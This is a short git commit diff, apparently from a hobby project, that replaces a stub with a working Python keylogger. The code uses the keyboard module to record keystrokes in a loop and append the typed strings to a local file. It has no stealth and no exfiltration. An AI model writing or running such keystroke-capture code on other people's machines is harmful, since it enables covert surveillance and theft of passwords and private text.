0419d54480bba043f816e36ce582558fc33effb8
B0ndr3wd <timeo.dubreu@gmail.com>
2026-02-10 20:41:43 +0100

    I see how keyboard module works

--- Keylogger.py
+++ Keylogger.py
@@ -1,2 +1,10 @@
-def keylogger():
-    pass
+# Import the keyboard module
+import keyboard 
+
+while True:
+    with open('info.txt', 'a') as info: # Create file
+        recording = keyboard.record(until='space') #--> When 'space' is enter, stop recording
+        text = list(keyboard.get_typed_strings(recording)) #--> Create a list of all typed text
+
+        info.write('\n') #--> Go to another line
+        info.write(text[0])
